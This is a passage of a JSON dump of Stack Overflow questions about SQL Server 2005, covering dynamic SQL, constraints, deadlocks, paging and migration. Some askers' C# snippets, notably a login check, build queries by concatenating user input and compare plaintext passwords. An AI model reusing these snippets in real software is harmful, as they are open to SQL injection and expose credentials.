appreciate if someone can refer me to a query/sproc that is FTS together with COALESCE .Please help.\nP.S </p>\n\n<pre><code>SET @SQL = '\nSET @query_result = ( \n    SELECT items.id AS \"ID\"\n            ,items.title AS \"Title\"\n            ,cars.brand AS \"Brand\"\n            ,cars.model AS \"Model\"\n            ,cars.type AS \"Type\"\n            ,items.city AS \"City\"\n            ,items.name AS \"Name\"\n            ,items.date_added AS \"Date\"\n            ,items.small_1 AS \"Image\"\n      FROM [cars]\n      JOIN [items] \n        ON items.id=cars.item_id\n     WHERE cars.item_id = COALESCE(@item_id,cars.item_id)\n            AND CONTAINS(cars.brand ,''COALESCE('+@brand+',cars.brand)'')\n            AND cars.model = COALESCE(@model,cars.model)\n            AND cars.type = COALESCE(@type,cars.type)\n            AND items.city = COALESCE(@city,items.city)\n            AND DATEDIFF(DAY,items.date_added,GETDATE())&lt;=COALESCE(@period,items.date_added)\n            AND items.new = COALESCE(@isnew,items.new)\n       FOR XML\n      PATH(''car''),ROOT(''items''))'\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","dynamic-sql"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":2519,"score":6,"question_id":3840730,"title":"Getting result of dynamic SQL into a variable","body":"<p>Executing dynamic SQL as follows in Stored Procedure:</p>\n\n<pre><code>DECLARE @sqlCommand nvarchar(1000)\nDECLARE @city varchar(75)\nSET @city = 'London'\nSET @sqlCommand = 'SELECT COUNT(*) FROM customers WHERE City = @city'\nEXECUTE sp_executesql @sqlCommand, N'@city nvarchar(75)', @city = @city\n</code></pre>\n\n<p>How do I use the count(*) column value as return value in the SP?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":12639339,"title":"Any chance to recover unicode data from varchar column","body":"<p>Unicode data (cyrillic) was written into database column of type <code>varchar</code></p>\n\n<p>Is there any chance to recover that data in correct format?</p>\n\n<p>It doesn't have to be fully recovered, anything will be great</p>\n\n<p>Thanks for any help</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":8289,"score":6,"question_id":547074,"title":"SQL Server: How do I add a constraint to an existing table but only if the constraint does not already exist?","body":"<p>I need to add a constraint to an existing SQL server table but only if it does not already exist.</p>\n\n<p>I am creating the constraint using the following SQL.</p>\n\n<pre><code>ALTER TABLE [Foo] ADD CONSTRAINT [FK_Foo_Bar] FOREIGN KEY ([BarId]) REFERENCES [Bar] ([BarId]) ON UPDATE CASCADE ON DELETE CASCADE\n</code></pre>\n\n<p>I'm hoping I can add some SQL to the begining of the SQL to test for the existence of the constraint but I have no idea how.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12639030,"title":"Get the list of stored procedures created and / or modified on a particular date?","body":"<p>I want to find which stored procedure I've created and also I want to find which stored procedure I've modified in my SQL Server on a particular date like 27 september 2012 (27/09/2012).</p>\n\n<p>Is there any query which will list these procedures that are created and also modified on this date?</p>\n\n<p>Thanks in advance</p>\n\n<p>Regards\nAmit Vyas</p>\n"},{"tags":["sql","sql-server-2005","rollback"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12383137,"title":"MS SQL 2005- Rollback Update query","body":"<p>I'm using MS SQL Server 2005 enterprise edition. I executed an update query to get affect a record in a row and a column. </p>\n\n<pre><code>update HS_SM_USERACCOUNT \nset ACCOUNTPOLICYTYPE=1  \nwhere EMP_NUMBER='000540' and USERID='03510410@' \n</code></pre>\n\n<p>Earlier the column called <code>ACCOUNTPOLICYTYPE</code> is holding value <code>1</code> for that particular condition in WHERE clause. Now I want to get the previous state without executing Update Query again.</p>\n\n<p>Will <code>ROLLBACK</code> help me? Please help me on this. </p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":1267002,"title":"Table access query","body":"<p>In our server client software in vb6 with SQL2005, On server side one SQL table is continuously updated by data and we need to display data from this same table on client at running time. Pleases help how to access this same table from server and client so that data is continuously updated from server side and records in this table show on client software without error. </p>\n"},{"tags":["sql-server-2005","propel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12635196,"title":"Propel, Having fields with spaces","body":"<p>Is it possible to have a space in the field name that is defined in the schema.xml?</p>\n\n<p><em>The bright spark who design</em> the database, used field names like 'POST CODE' and 'CURRENT'       </p>\n\n<p>Is there a way around this? or am i stuck?        </p>\n\n<blockquote>\n  <p>The database is an existing MSSQL 2005 database, with an <em>unknown</em>\n  number of systems connected to it. So it cannot be changed.</p>\n  \n  <p>I am using the reverse command to generate the schema.xml</p>\n\n<pre><code>propel-gen . reverse\n</code></pre>\n</blockquote>\n\n<p>Propel 1.6.7</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1132,"score":0,"question_id":3137647,"title":"Using SQL Server Management Studio Express to Backup DB","body":"<p>I am wanting to backup a SQl Server 2005 db at a remote site (ie. to ultimately have a backup file of the db here locally on my machine).</p>\n\n<p>Can this be done using SQL Server Management Studio Express ? I have this installed and running.. but cannot seem to find a way of backing up using it. \nIf this isn't possible, how do I create a backup of my remote db some other way ?</p>\n\n<p>Thank you,</p>\n\n<p>Bazza</p>\n"},{"tags":["sql-server-2005","reporting-services","reportingservices-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":861,"score":3,"question_id":655435,"title":"SSRS 2005 Report Automatically Rendering","body":"<p>I have created a number of SSRS 2005 reports, and provided a number of parameters for each. Each of the parameters have default values, and therefore the report automatically renders when someone visits the report through the SSRS web site. </p>\n\n<p>What I'd like to do is have all the reports have their default values, but prevent the report from automatically rendering. I've looked online, and I haven't seen anything aside from people claiming that it cannot be done. I'm hoping to see some expert advice on this one for a method of preventing the reports from automatically rendering without having to develop a custom web interface.</p>\n\n<p>Any thoughts?</p>\n\n<p>Does anyone know if this behavior is different in SSRS 2008?</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12614911,"title":"How can I migrate a SQL Server 2005 database to SQL Server 2008?","body":"<p>I am trying to migrate my one SQL Server 2005 database to SQL Server 2008, with various option, like Script Database.</p>\n\n<p>I am able to create table structure but without any objects like data, functions, stored procedure.... </p>\n\n<p>How can I do this? I tried to copy <code>.mdf</code> and <code>.ldf</code> file and put them into 2008 folder, but this is also not working.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12626334,"title":"Select Query Error","body":"<p>I want to create a login account  by matching UserName &amp; Password. I want to save the result in a local variable named as result. When a user logs in, the result should be one, but it always returning -1. My code is following......</p>\n\n<pre><code>    protected void LoginBtn_Click(object sender, EventArgs e)\n    {\n        string Name = nameTextBox.Text;\n        string Password = passwordTextBox.Text;\n        nameTextBox.Text = \"\";\n        passwordTextBox.Text = \"\";\n        string connectionstring = @\"Integrated Security=True;Initial Catalog=HMIS;Data Source=.\\SQLEXPRESS\";\n        SqlConnection connection = new SqlConnection(connectionstring);\n        connection.Open();\n        string selectquery = \"Select ID from  UsersInfo where UserName='\" + @Name+ \"' and Password='\" + @Password + \"'\";\n        SqlCommand cmd = new SqlCommand(selectquery, connection);\n        cmd.Parameters.AddWithValue(\"@UserName\", Name);\n        cmd.Parameters.AddWithValue(\"@Password\", Password);\n         //object result = cmd.ExecuteNonQuery();\n        //if (result != null)\n        int result = (int)cmd.ExecuteNonQuery();\n        if (result &gt; 0) \n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","like-operator"],"answer_count":5,"favorite_count":3,"up_vote_count":13,"down_vote_count":0,"view_count":1871,"score":13,"question_id":5754934,"title":"LIKE with integers, in SQL","body":"<p><strong>Can I replace</strong> the  <code>=</code>  statement with the <code>LIKE</code> one for the integers <strong>?</strong></p>\n\n<p>by eg. are the following the same thing:</p>\n\n<pre><code>select * from FOOS where FOOID like 2    \n// and \nselect * from FOOS where FOOID = 2\n</code></pre>\n\n<p>I'd prefer to use <code>LIKE</code> instead of <code>=</code> because I could use <code>%</code> when I have no filter for FOOID...</p>\n\n<p>SQL Server 2005.</p>\n\n<p><strong>EDIT 1 @Martin</strong><br>\n<img src=\"http://i.stack.imgur.com/gBlYC.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server-2005","debugging","ssis","watch"],"answer_count":2,"favorite_count":4,"up_vote_count":20,"down_vote_count":0,"view_count":19813,"score":20,"question_id":582166,"title":"Watching variables in SSIS during debug","body":"<p>I have a project in SSIS and I've added an Execute SQL Task which sends its result out to a variable. I wanted to confirm the value because I was worried that it would try to write it out as a resultset object rather than an actual integer (in this case I'm returning a COUNT).</p>\n\n<p>My first thought was just to run it in debug mode and add the global variable to my Watch window. Unfortunately, when I right-click on the Watch window, the option to \"Add Variable\" is greyed out. What am I missing here?</p>\n\n<p>I've gotten around confirming that my variable is set correctly, so I'm not interested in methods like putting a script in to do a MsgBox with the value or anything like that. For future reference I'd like to be able to watch variables in debug mode. If there are some kind of constraints on that then I'd like to know the what and why of it all if anyone knows.</p>\n\n<p>The help is woefully inadequate on this one and every \"tutorial\" that I can find just says, \"Add the variable to the Watch window and debug\" as though there should never be a problem doing that.</p>\n\n<p>Thanks for any insight!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":22263,"score":10,"question_id":595762,"title":"Calculate execution time of a SQL query?","body":"<p>I am providing search functionality in my website, when user searches a record then I want to display the time the query taken to get the results same as google does. When we search anything then google displays how much time it takes to get results?</p>\n\n<p>For this I have declared a @start variable in my SP and finding the difference in the end, as below;</p>\n\n<pre><code>DECLARE @start_time DATETIME\n\nSET @start_time = GETDATE()\n\n-- my query\nSELECT * FROM @search_temp_table\n\nSELECT RTRIM(CAST(DATEDIFF(MS, @start_time, GETDATE()) AS CHAR(10))) AS 'TimeTaken'\n</code></pre>\n\n<p>Is there any other easy and fast way, or a single line of query with which we can find out the time a query taken to execute?</p>\n\n<p>I'm using SQL2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12623315,"title":"sql statement insert into with select?","body":"<p>I have a table with columns:</p>\n\n<pre><code>StudentID\nValue1\nValue2\nValue3\n</code></pre>\n\n<p>...and I have three queries, each one will come with the studentID and a value(1 to 3) fields</p>\n\n<p>What I would like to do is to update this table, with parallel values, if a student exists then update the corresponding column if not, create a new row.</p>\n\n<p>I'm working with SQL Server 2005</p>\n"},{"tags":["sql","sql-server-2005","refactoring"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12623167,"title":"Removing duplication in dynamic ROW_NUMBER() OVER ORDER BY statement","body":"<p>I have the following snippet from a SQL statements</p>\n\n<pre><code>ROW_NUMBER() OVER (ORDER BY CASE\n    WHEN @SortBy = 'column1 ASC' THEN cast(column1 AS sql_variant)\n    WHEN @SortBy = 'column2 ASC' THEN cast(column2 AS sql_variant)\n    WHEN @SortBy = 'column3 ASC' THEN cast(column3 AS sql_variant)\n    WHEN @SortBy = 'column4 ASC' THEN cast(column4 AS sql_variant)\n    ELSE NULL\nEND ASC,\nCASE\n    WHEN @SortBy = 'column1 DESC' THEN cast(column1 AS sql_variant)\n    WHEN @SortBy = 'column2 DESC' THEN cast(column2 AS sql_variant)\n    WHEN @SortBy = 'column3 DESC' THEN cast(column3 AS sql_variant)\n    WHEN @SortBy = 'column4 DESC' THEN cast(column4 AS sql_variant)\n    ELSE NULL\nEND DESC) AS RowNumber\n</code></pre>\n\n<p>It works, but it's quite repetitive, is there a way to make the ASC/DESC dynamic as well, so I don't need the duplicated <code>CASE</code> statement?</p>\n"},{"tags":["tsql","sql-server-2005","merge"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12621241,"title":"Can I use the MERGE statement in SQL Server 2005?","body":"<p>I am using SQL Server 2005 and I wanted to create MERGE statement or concept in single query in SQL Server 2005. Is it possible?</p>\n"},{"tags":["sql","sql-server-2005","reporting-services","reportingservices-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":11882562,"title":"SQL SSRS Report Builder - cannot see views only tables?","body":"<p>I am using SSRS Report Builder with SQL 2005 and I am trying to build some reports from my data sources.  </p>\n\n<p>However when I bring up the data source entities it is only showing tables not views which is what I want to use to make the coding neater and easy to use.  </p>\n\n<p>Am I missing something?  Can anyone advise a way to get the views to be shown up in the Entities options?</p>\n\n<p>Any help much appreciated.</p>\n\n<p>Thanks,</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","thread-safety"],"answer_count":5,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":1482,"score":6,"question_id":1483383,"title":"Is this stored procedure thread-safe? (or whatever the equiv is on SQL Server)","body":"<p>With the help of others on SO I've knocked up a couple of Tables and Stored Procedures, this morning, as I'm far from a DB programmer.</p>\n\n<p>Would someone mind casting an eye over this and telling me if it's thread-safe?  I guess that's probably not the term DBAs/DB developers use but I hope you get the idea: basically, what happens if this sp is executing and another comes along at the same time?  Could one interfere with the other?  Is this even an issue in SQL/SPs?</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[usp_NewTicketNumber]\n\t@ticketNumber int OUTPUT\nAS\nBEGIN\n\tSET NOCOUNT ON;\n\tINSERT INTO [TEST_Db42].[dbo].[TicketNumber]\n\t\t\t   ([CreatedDateTime], [CreatedBy])\n\t\t VALUES\n\t\t\t\t(GETDATE(), SUSER_SNAME())\n\tSELECT @ticketNumber = IDENT_CURRENT('[dbo].[TicketNumber]');\n\tRETURN 0;\nEND\n</code></pre>\n"},{"tags":["python","sqlite","sql-server-2005","sqlalchemy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12619566,"title":"Query working in SQL Server  but dont work in sqlite","body":"<p>In one program on python i'm making query to SQL Server 2005 via sqlalchemy:</p>\n\n<pre><code>SELECT * FROM table \nWHERE (cipher=:value? OR CHARINDEX(cipher_mask,:value?)!=0)\nand NOT exists( SELECT * FROM table WHERE CHARINDEX(not_cipher_mask,:value?)!=0 AND code=:code?)\nand code=:code?\n</code></pre>\n\n<p>This works fine.</p>\n\n<p>I'm trying to create similar query for SQLite (it does not use function <code>CHARINDEX</code>)</p>\n\n<pre><code>SELECT * FROM table \nwhere (cipher=:value?  OR :value?  like cipher_mask+'/%')\nand not exists (SELECT * FROM table  where code=:code? and :value? like not_cipher_mask +'/%') and code=:code?\n</code></pre>\n\n<p>This works fine in SQL Server 2005, but in SQLite, I get an empty result</p>\n\n<p>Why it is not working here?</p>\n\n<p>P.S. All columns in table are <code>VARCHAR</code> with same data</p>\n"},{"tags":["sql","sql-server","sql-server-2005","common-table-expression"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2060,"score":3,"question_id":2618102,"title":"SQL: Recursively get parent records using Common Table Expressions","body":"<p>Suposse you have to following tables where a sale consists of products and a product can be placed in multiple categories. Whereby categories have a hierachly structure like:</p>\n\n<pre><code>Man\n Shoes\n  Sport\n  Casual\n Watches\nWomen\n Shoes\n  Sport\n  Casual\n Watches\n</code></pre>\n\n<p>Tables:</p>\n\n<pre><code>Sale:\n    id name \n    1  Sale1\n\nProduct:\n    id saleidfk name \n    1  1        a\n    2  1        b\n    3  1        c\n    4  1        d\n    5  1        e\n\nProductCategory :\n    productid categoryid \n    1         3\n    2         3           \n    3         4\n    4         5\n    5         10     \n\nCategory:\n    id ParentCategoryIdFk name \n    1  null               Men\n    2  1                  Shoes\n    3  2                  Sport\n    4  2                  Casual\n    5  1                  Watches\n    6  null               Women\n    7  6                  Shoes\n    8  7                  Sport\n    9  7                  Casual\n    10 6                 Watches\n</code></pre>\n\n<p>Question:</p>\n\n<p>Now on my website I want to create a control where only the categories are shown of a certain sale and where the categories are filled with the products of the sale. I also want\nto include the hierachly structure of the categories. So if we have a leave node, recusivly go up to the top node.</p>\n\n<p>So with sale1 I should have a query with the following result:</p>\n\n<pre><code>Men\n  Shoes\n    Sport\n    Casual\n  Watches\nWomen\n  Watches\n</code></pre>\n\n<p>This thing is driving me crazy :-)</p>\n\n<p>Thanks in advance!</p>\n\n<p>Gr</p>\n\n<p>Martijn</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":48791,"score":12,"question_id":792294,"title":"How to get first character of a string in SQL?","body":"<p>I have a SQL column with length of 6. Now want to take only first char of that column. Is the any string function in SQL to do this?</p>\n"},{"tags":["sql-server","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12060271,"title":"XQuery on 2005 and SQLSM2008","body":"<p>If You run this script on sql server 2008, works fine.</p>\n\n<pre><code>declare @tab table(\nid_emp int,\nFIL_ROT_WID xml\n)\n\ninsert into @tab\nselect 0, '&lt;xml&gt;&lt;/xml&gt;'\n\ndeclare @xml_rot_widget xml\nset @xml_rot_widget = '&lt;ati id=\"1123\" val=\"new()\" /&gt;'\n\nupdate @tab\nset FIL_ROT_WID.modify('insert sql:variable(\"@xml_rot_widget\")\n                    as last\n                    into (/xml)[1]')\nwhere id_emp = 0\n\nselect * from @tab\n</code></pre>\n\n<p>But Im using SQL Server 2005 with SQLSMS2008 and this scripts works fine too. But with the same level of databse em SQLSMS2005 I receive the following error:</p>\n\n<pre><code>XQuery: SQL type 'xml' is not supported in XQuery.\n</code></pre>\n\n<p>Im already solve the problem, but my question is:\nHow to configure the SQLSMS2008 to run script and parse them for DB 2005?</p>\n\n<p>Ah, <strong>Tools > Options > SQL Server Object Explorer > Scripting > Script for server version</strong>\ndoes not work. It keep running like 2008.</p>\n\n<p>Tks</p>\n"},{"tags":["sql-server-2005","nhibernate","nhibernate-criteria"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":10879031,"title":"nhibernate, sql server Datetime compare failing","body":"<p>In nhibernate i am using following to compare date</p>\n\n<pre><code>Restrictions.Eq(Projections.Property(\"SubmittedDate\"), request.Data.SubmittedDateTime.Value)\n</code></pre>\n\n<p>in local environment its working. but in other environment its not returning result.</p>\n\n<pre><code>SubmittedDateTime? is nullable\n</code></pre>\n\n<p>do i need to mention nullable somewhere in mapping file.</p>\n\n<p>Is there any change i need to do in code for this?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12609795,"title":"SQL Server : Distinct + random rows","body":"<p>How do I pick distinct as well as random rows from a SQL Server 2008/2005 table?</p>\n\n<p>I have a list of tips from which I need to pick a few tips <strong>randomly</strong> and they must be <strong>unique</strong> too.</p>\n\n<p>I tried:</p>\n\n<pre><code>Select \n    Distinct Tips \nFrom \n    jfpastrologytips \nWhere \n    GetDate() &lt;= validtill \nOrder by \n    NewId()\n</code></pre>\n\n<p>and got commissioned with exception</p>\n\n<blockquote>\n  <p><em>Msg 145, Level 15, State 1, Line 1<br>\n  ORDER BY items must appear in the select list if SELECT DISTINCT is specified.</em></p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":7762,"score":1,"question_id":771248,"title":"Size of a single Record ? SQL","body":"<p>I have a scenario where every user has been allocated 2 MB of database space.\nNow I have to show Percenatge usage of their allocated space, to do so I need to know the size of single record in the Table.</p>\n\n<p>I have tried to use sp_spaceused and even wrote a custom procedure making use of datalength .. but they show vast difference in their result.</p>\n\n<p>Is there any way around to get this thing right.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-server-2000"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12606634,"title":"SQL temptables Loop query","body":"<p>I have a temporary Table which looks like </p>\n\n<p>TmpTable :</p>\n\n<pre><code>          ID(not unique)   Platform Name    OS    version \n\n           13                 UNIX          Ipad     5.1\n           13                 Windows       Windows  2008\n           14                 MAC           Ipad     4.1\n</code></pre>\n\n<p>Look_UP Tbl : for each of the above columns </p>\n\n<pre><code>    PlatformName LookuP Tbl: platform id  desc\n                                 2        Unix\n                                 5        windows\n\n       OS Lookup            :  OS id    OSname\n                                 4       Ipad\n\n    Version Lookup          :  Version id  name\n                                 5         5.1\n</code></pre>\n\n<p>Then Have EmpPlatformID , EmpOSID &amp; EmpVersionID like below ;</p>\n\n<pre><code>       EmpPlatform  - EmpId  PltformNameID\n                       13         1\n                       13         6\n       same for OS &amp; ID \n</code></pre>\n\n<p>I need a query that\n1) uses the lookup tables to get the corresponding ID for each column(PlatformName,OS,Version) for each of the employee id . \n2) Insert the ID for that empid in each of the actual tables .</p>\n\n<p>So , empPlatformTable should look like ;</p>\n\n<pre><code>       EmpPlatform  - EmpId  PltformNameID\n                       13         1\n                       13         6\n                       13         2    - new row added from tmptbl\n                       13         5    - new row added from tmptbl\n The EmpOS &amp; EmpVer also has similar column so the emp id should have corresponding IDs inserted from temptbl . please helps\n</code></pre>\n\n<p>EDIT:\nCode to update PlatformName</p>\n\n<pre><code>Update EmpPN \n    Set EmpN.platform_id = PLookup.platform_id \nfrom #TempTable tmpd (READUNCOMMITTED) \ninner join EmpPlatform EmpPN (READUNCOMMITTED) \n    on EmpPN.emp_id = emp_id collate database_default \ninner join PlatformLookUpTbl PLookup(READUNCOMMITTED)\n    on PLookup.[platform_name] = tmpd.PlatformName collate database_default\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12606284,"title":"SQL Server 2005 Delete Query SLOW","body":"<p>I have a Delete Query that each day needs to run deleting any data that is greater than 7 days old which is about 6 Million Records.</p>\n\n<p>My table should only store data for the last 7 days. </p>\n\n<p>Here is the query I am running:</p>\n\n<pre><code>DELETE FROM [tblTSS_DataCollection]\nWhere [DatapointDate] &lt; DATEADD(D, -7, GETDATE()) \n</code></pre>\n\n<p>This query takes 5.5 minutes to execute. I have an index setup that includes this so I don't think it should be taking this long to execute:</p>\n\n<pre><code>CREATE UNIQUE NONCLUSTERED INDEX [IX_tblTSS_DataCollection] ON [dbo].  [tblTSS_DataCollection] \n(\n[DataPointID] ASC,\n[DatapointDate] ASC,\n[AssetID] ASC\n)\n</code></pre>\n\n<p>Is there a better way to delete this data? It takes forever and I really need to be able to delete this data quickly.</p>\n"},{"tags":["sql-server-2005","parent-child","flatten"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12604512,"title":"Establish Parent/Child Relationship and Flatten File","body":"<pre><code>DECLARE @LIST VARCHAR(1000)\nSET @LIST = ''\n\nSELECT @LIST = @LIST + MASTER.EE_GROUP + '' FROM (SELECT DISTINCT \n      EMPLOYEE\n    , EE_GROUP\nFROM MASTER\nWHERE MSTR_END LIKE '%1753%') WHERE PARENTID = @ID\n\nRETURN @LIST  \n</code></pre>\n\n<p><code>SELECT</code> query returns data such as: </p>\n\n<pre><code> EMPLOYEE       EE_GROUP\n 8              A\n 8              B\n 8              C\n 9              D\n 10             B\n</code></pre>\n\n<p>Need result: </p>\n\n<pre><code> EMPLOYEE      GROUP1      GROUP2         GROUP3\n 8             A           B              C\n 9             D           NONE (OR NULL) NONE (OR NULL)\n 10            B           NONE (OR NULL) NONE (OR NULL) \n</code></pre>\n\n<p>Receiving following errors. I am assuming because there is not a parent-child relationship established. I don't know how to resolve this. </p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 9<br>\n  Incorrect syntax near the keyword 'WHERE'.<br>\n  Msg 178, Level 15, State 1, Line 11<br>\n  A RETURN statement with a return value cannot be used in this context.</p>\n</blockquote>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12605511,"title":"SQL Server 2005 - incorrect value in sys.master_files","body":"<p>I'm running SQL Server 2005 on a 64-bit Windows 7 machine (installed to Program Files (x86)).  The problem I'm having is that when I try to access my database through Java, the method fails, as it looks for the database in the wrong directory (it looks for it in Program Files).  After a little tinkering around, I think I'v found the problem: the physical_name value in sys.master_files (that references the database locations) is pointing to the wrong folder.</p>\n\n<p>Does anybody know how this may have happened or how to fix it?  SQL Server won't let me update sys.master_files with the correct value.</p>\n"},{"tags":["sql","sql-server-2005","optimization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12602590,"title":"SQL Query optimisation not exists","body":"<p>I need to optimise the following query, can anyone help? I know it's the Not Exists part that is causing the problem as it is doing a massive table scan, but I'm new to this, can anyone give any advice?</p>\n\n<pre><code>select count(*)\nfrom Job j\nwhere company = 'A'\nand branch = 'Branch123'\nand engineerNumber = '000123'\nand ID &gt; 60473\nand not exists(\nselect JobNumber, Company, Branch\nfrom OutboundEvents o\nwhere o.JobNumber = j.JobNumber\n    and o.branch = j.branch\n    and o.company = j.company\n    and o.Formtype = 'CompleteJob')\n</code></pre>\n"},{"tags":["c#",".net","sql-server","sql-server-2005","ado.net"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4223,"score":0,"question_id":3491302,"title":"Select a data from MS SQL Server 2005","body":"<p>I have a table named <code>t_Student</code> in Microsoft SQL Server 2005 database. In that table there are three columns named <code>student_regiNo</code>, <code>student_Name</code>, <code>student_Email</code>.</p>\n\n<p>I'm using following code segment to retrieve \"student_Name\". But instead of showing \"student_Name\" it shows \"System.Data.SqlClient.SqlDataReader\". Whats the problem?</p>\n\n<pre><code>private void GetDatabaseConnection()\n{\n    string connectionString = @\"server=RZS-F839AD139AA\\SQLEXPRESS; Integrated Security = SSPI; database = StudentCourseInformation\";\n    connection = new SqlConnection(connectionString);\n    connection.Open();\n}\n\npublic string GateStudentName(string selectedStudentRegiNo)\n{\n    GetDatabaseConnection();\n\n    string selectedStudentQuery = @\"SELECT student_Name FROM t_Student WHERE (\n                                  student_regiNo = \n                                  '\" +selectedStudentRegiNo+ @\"'  \n                                   )\";\n    SqlCommand command = new SqlCommand(selectedStudentQuery, connection);\n    SqlDataReader reader = command.ExecuteReader();\n\n    string selectedStudentName = Convert.ToString(reader);\n    return selectedStudentName;\n}\n</code></pre>\n"},{"tags":["php","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":363,"score":0,"question_id":10387386,"title":"Equivalent of LIMIT in T-SQL","body":"<p>In PHP I'm doing a SQL Server query where I need (LIMIT) type functionality.  I already know that TOP is typically used in SQL Server instead of LIMIT (which is MySQL syntax).  However, TOP doesn't allow you to set on 'offset' the way LIMIT does.  In my query, I will need the 'offset' and 'number of rows' to be dynamic. Example:  </p>\n\n<pre><code>LIMIT $startRow, $maxRow\n</code></pre>\n\n<p>Any thought, or suggestions?</p>\n"},{"tags":["sql-server-2005","stored-procedures","triggers"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":355,"score":2,"question_id":4261278,"title":"Is it possible for a trigger to find the name of the stored procedure that modified data?","body":"<p>There are a few stored procedures that routinely get called by a few different systems to do maintenance on a few tables in our database. Some are automated, some aren't.</p>\n\n<p>One of the tables has a column where the number is sometimes off, and we don't know for sure when or why this is happening. I want to put a trigger on the table so I can see what is being changed and when, but it'd also be helpful to know which procedure initiated the modification.</p>\n\n<p>Is it possible to get the name of the stored procedure from the trigger? If not, is there any other way to tell what caused something to be modified? (I'm not talking about the user either, the name of the user doesn't help in this case).</p>\n"},{"tags":["sql-server-2005","locking","insert-update","database-deadlocks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":402,"score":0,"question_id":10599275,"title":"Why can't I insert/update data without locking the entire table in SQL Server 2005?","body":"<p>I am trying to insert/update rows in a SQL Server table (depending on whether it exists or not). I am executing the SQL from multiple threads on multiple machines and I want to avoid getting duplicate key errors.</p>\n\n<p>I have found many solutions online but all of them are causing transaction deadlocks. This is the general pattern I have been using:</p>\n\n<pre><code>BEGIN TRANSACTION\n\nUPDATE TestTable WITH (UPDLOCK, SERIALIZABLE)\nSET Data = @Data \nWHERE Key = @Key\n\nIF(@@ROWCOUNT = 0)\nBEGIN\n     INSERT INTO TestTable (Key, Data)\n     VALUES (@Key, @Data)\nEND\n\nCOMMIT TRANSACTION\n</code></pre>\n\n<p>I have tried:</p>\n\n<ul>\n<li><code>WITH XLOCK</code> instead of <code>UPDLOCK</code></li>\n<li><code>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE</code> at the beginning with <code>UPDLOCK</code></li>\n<li><code>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE</code> and no table hints</li>\n</ul>\n\n<p>I have also tried the following pattern with all the combinations above:</p>\n\n<pre><code>BEGIN TRANSACTION\n\nIF EXISTS (SELECT 1 FROM TestTable 